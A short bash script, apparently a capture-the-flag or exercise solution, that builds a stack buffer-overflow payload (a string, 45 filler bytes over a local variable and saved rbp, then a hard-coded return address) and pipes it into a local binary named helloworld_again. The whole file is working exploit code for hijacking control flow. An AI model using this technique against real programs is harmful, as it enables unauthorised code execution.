#!/bin/bash

if [[ -e payload_2 ]]; then
    rm payload_2
fi

printf "helloworld\0" > payload_2 # rewrite 11 bytes of local var
printf 'a%.0s' {1..45} >> payload_2 # 37+8, rewrite 45 bytes of local var and frame point rbp
printf "\x5b\x12\x40\x00\x00\x00\x00\x00" >> payload_2

cat payload_2 - | ./helloworld_again
